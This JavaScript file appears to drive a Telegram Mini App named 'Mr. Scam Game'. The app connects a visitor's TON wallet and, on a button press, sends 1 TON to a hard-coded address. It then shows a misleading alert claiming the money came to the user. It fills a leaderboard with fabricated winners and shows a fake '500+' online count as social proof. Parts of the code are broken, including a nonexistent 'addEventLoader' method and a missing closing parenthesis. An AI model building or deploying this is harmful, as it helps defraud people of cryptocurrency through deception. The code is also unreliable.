window.addEventLoader('load', () => {
  const tg = window.Telegram.WebApp;

  if (!tg || !tg.initDataUnsafe) {
    // В браузере — показываем кнопку с редиректом
    document.body.innerHTML = `
      <div style="text-align:center; padding:50px; font-size:1.5em; color:#fff;">
        <h1>🚫 Доступ запрещён</h1>
        <p>Mr. Scam Game работает только внутри Telegram.</p>
        <a href="https://t.me/MrScam_bot" style="background:#0088cc; color:#fff; border:none; padding:15px 30px; font-size:1.5em; border-radius:8px; cursor:pointer; text-decoration:none;">Открыть в Telegram</a>
      </div>
    `;
    return;
  }

  // В Telegram — запускаем приложение
  tg.expand();
  tg.ready();

  const usernameEl = document.getElementById('username');
  let username = 'Guest';
  if (tg.initDataUnsafe.user) {
    const user = tg.initDataUnsafe.user;
    username = user.username ? '@' + user.username : user.first_name || 'User';
  }
  usernameEl.textContent = 'Профиль: ' + username;

  const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://mr-scam.vercel.app/tonconnect-manifest.json',
    buttonRootId: 'connect-container',
    actionsConfiguration: {
      twaReturnUrl: 'https://t.me/MrScam_bot'
    }
  });

  let connectedWallet = null;
  tonConnectUI.onStatusChange(wallet => {
    if (wallet) {
      connectedWallet = wallet.account.address;
      document.getElementById('payment-section').style.display = 'block';
    } else {
      connectedWallet = null;
      document.getElementById('payment-section').style.display = 'none';
    }
  });

  document.getElementById('payment-btn').onclick = async () => {
    if (!connectedWallet) {
      alert('⚠️ Подключите кошелёк сначала!');
      return;
    }

    const transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 600,
      messages: [{
        address: 'UQBxxQgA8-hj4UqV-UGNyg8AqOcLYWPsJ4c_3ybg8dyH7jiD',
        amount: '1000000000' // 1 TON
      }]
    };

    try {
      await tonConnectUI.sendTransaction(transaction);
      alert('✅ 1 TON успешно внесено! Деньги пришли тебе 😈');
    } catch (e) {
      alert('❌ Ошибка или отменено');
    }
  };

  // Реферальная система
  const userId = tg.initDataUnsafe.user.id || Math.random().toString(36).slice(2);
  document.getElementById('referral-link').textContent = `https://t.me/MrScam_bot?start=ref_${userId}`;

  // Лидерборд (тестовые данные)
  const leaderTable = document.getElementById('leader-table').getElementsByTagName('tbody')[0];
  const leaders = [
    { username: '@scam_king', balance: '10.5 TON' },
    { username: '@ton_hustler', balance: '8.2 TON' },
    { username: username, balance: '1.0 TON' }
  ];
  leaders.forEach(l => {
    const row = leaderTable.insertRow();
    row.insertCell(0).textContent = l.username;
    row.insertCell(1).textContent = l.balance;
  });

  // Реальное количество онлайн (fetch с Vercel API)
  fetch('/api/online')
    .then(res => res.json())
    .then(data => {
      document.getElementById('online-count').textContent = data.online || '500+';
    }).catch(() => {
      document.getElementById('online-count').textContent = '500+';
    });
}
